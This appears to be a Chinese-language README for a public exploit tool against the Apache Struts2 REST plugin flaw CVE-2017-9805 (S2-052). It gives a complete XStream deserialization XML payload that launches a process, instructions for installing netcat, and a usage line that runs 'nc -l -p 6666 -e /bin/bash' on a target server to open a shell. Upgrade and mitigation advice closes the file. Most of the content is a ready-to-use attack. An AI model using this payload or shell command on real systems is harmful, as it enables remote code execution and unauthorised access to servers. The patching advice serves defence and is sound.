# CVE-2017-9805 （S2-052）反弹Shell Exploit

## 影响版本
```
Struts 2.1.2 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12
```

## Poc

```
Content-Type: application/xml

<map>
<entry>
<jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command> <string>calc</string> </command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
</entry>
</map>

Windows <command><string>calc</string></command>

Mac <command><string>/Applications/Calculator.app/Contents/MacOS/Calculator</string></command>
```

## 漏洞复现详情

https://secfree.com/article-333.html

##  CentOs 7 安装 Nc
```
rpm -ivh netcat-1.10-891.2.x86_64.rpm
```

## 选项

```
 [*] Apache Struts2 CVE-2017-9805 (S2-052) - Exploit
 [*] 0day Info:https://secfree.com/article-333.html
 [*] Use:        <targetUrl> <command>
 [*] Author:  www.secFree.com Team By Bearcat
```

## 使用

```
java -jar CVE-2017-9805-Exploit.jar http://192.168.199.246:8080/struts2-rest-showcase/orders.xhtml "nc -l -p 6666 -e /bin/bash"

nc 192.168.199.246 6666
```

![exploit](https://github.com/iBearcat/S2-052/blob/master/exploit.jpg?raw=true)

本Exploit只做Shell反弹，如执行命令回显请https://github.com/luc10/struts-rce-cve-2017-9805

## 修复方案

1.建议尽快升级到 2.5.13版本。

2.在不使用时删除 Struts REST插件，或仅限于服务器普通页面和JSONs：

```
<constant name=”struts.action.extension” value=”xhtml,,json” />
```

3.限制服务器端扩展类型，删除XML支持。
